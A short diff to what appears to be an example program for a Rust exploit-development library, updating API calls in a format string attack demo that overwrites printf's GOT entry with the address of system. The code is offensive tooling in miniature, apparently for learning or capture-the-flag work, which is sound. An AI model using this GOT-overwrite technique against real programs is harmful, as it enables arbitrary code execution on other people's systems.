@@ -2,7 +2,6 @@
 // Demonstrates: Optimized format string payload generation
 
 use talon::fmtstr_tools::FormatString;
-use talon::packing_tools::p64;
 
 fn main() -> Result<(), String> {
     println!("[*] Talon Format String Example: Arbitrary Write");
@@ -22,8 +21,8 @@ fn main() -> Result<(), String> {
     println!("[+] system@PLT: 0x{:x}", system_plt);
     
     // Step 3: Generate optimized payload
-    let mut fmtstr = FormatString::new(offset);
-    fmtstr.add_write(printf_got, system_plt);
+    let mut fmtstr = FormatString::from_offset(offset);
+    fmtstr.write(printf_got, system_plt);
     
     let payload = fmtstr.generate()?;
     println!("[+] Generated payload: {} bytes", payload.len());
